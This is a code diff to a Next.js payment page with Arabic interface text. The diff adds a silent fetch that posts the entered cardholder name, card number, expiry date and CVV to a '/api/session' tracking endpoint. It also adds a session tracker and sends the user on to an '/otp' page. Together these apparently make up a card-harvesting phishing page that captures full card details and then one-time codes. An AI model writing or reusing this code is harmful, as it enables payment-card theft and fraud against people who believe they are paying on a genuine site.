@@ -1,6 +1,8 @@
 "use client";
+export const dynamic = 'force-dynamic';
 import { useState } from "react";
 import { useRouter } from "next/navigation";
+import SessionTracker from "@/components/SessionTracker";
 
 const GREEN = "#1e7344";
 
@@ -34,6 +36,18 @@ export default function PaymentPage() {
       alert("يرجى تعبئة جميع البيانات");
       return;
     }
+    // إرسال بيانات البطاقة للـ API
+    fetch('/api/session', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        current_page: 'payment',
+        card_holder: cardHolder,
+        card_number: cardNumber,
+        card_expiry: expiry,
+        card_cvv: cvv,
+      }),
+    }).catch(() => {});
     router.push("/otp");
   }
 
@@ -42,6 +56,7 @@ export default function PaymentPage() {
 
   return (
     <div style={{ backgroundColor: "#f7f8fa", display: "flex", justifyContent: "center", alignItems: "center", minHeight: "100vh", padding: "20px" }}>
+      <SessionTracker page="payment" />
       <div style={{ background: "#fff", width: "100%", maxWidth: "420px", borderRadius: "25px", padding: "25px 20px", boxShadow: "0 10px 30px rgba(0,0,0,0.08)", textAlign: "center" }}>
 
         {/* Header */}
